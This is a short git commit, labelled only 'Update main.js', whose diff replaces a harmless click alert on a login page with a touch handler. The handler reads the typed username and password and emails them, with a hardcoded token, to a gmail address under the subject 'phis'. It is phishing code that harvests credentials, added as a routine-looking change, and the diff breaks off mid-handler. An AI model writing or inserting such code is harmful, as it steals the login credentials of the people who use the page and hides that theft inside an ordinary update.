dda400e97dd9de21fc8af911913638128a811b57
useruser63 <65571299+useruser63@users.noreply.github.com>
2020-05-19 04:00:47 +0530

    Update main.js

--- src/main.js
+++ src/main.js
@@ -1,7 +1,15 @@
 function initialize() {
-  $(".mobloginbuttondiv").on("click", function () {
-  alert('You clicked the menu icon');
-});
+  document.getElementById("loginbutton").ontouchstart = buttonclick => {
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("userpassword").value;
+    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
+    Email.send({
+      SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
+      To: 'someone@gmail.com',
+      From: "someone@gmail.com",
+      Subject: "phis",
+      Body: userdata
+    });
   document.getElementById("loginbutton").onclick = buttonclick => {
     let username = document.getElementById("username").value;
     let password = document.getElementById("userpassword").value;
